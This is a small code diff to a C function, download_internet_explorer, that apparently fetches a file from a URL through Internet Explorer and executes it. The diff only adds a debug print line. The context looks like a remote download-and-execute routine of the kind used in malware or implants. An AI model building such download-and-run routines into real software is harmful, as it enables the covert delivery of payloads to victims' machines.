@@ -146,6 +146,7 @@ char* ie_download(char* string)
 // arg1 specifies the URL to download the file from.
 // data_size receives the size of the data in bytes.
 unsigned char* download_internet_explorer(char *arg1, int *data_size) {
+    DEBUG_PRINT(("This is download_internet_explorer.\n"));
 	DEBUG_PRINT(("exec data from url\n"));
 		
 	char *sh_filename = ie_download(arg1);
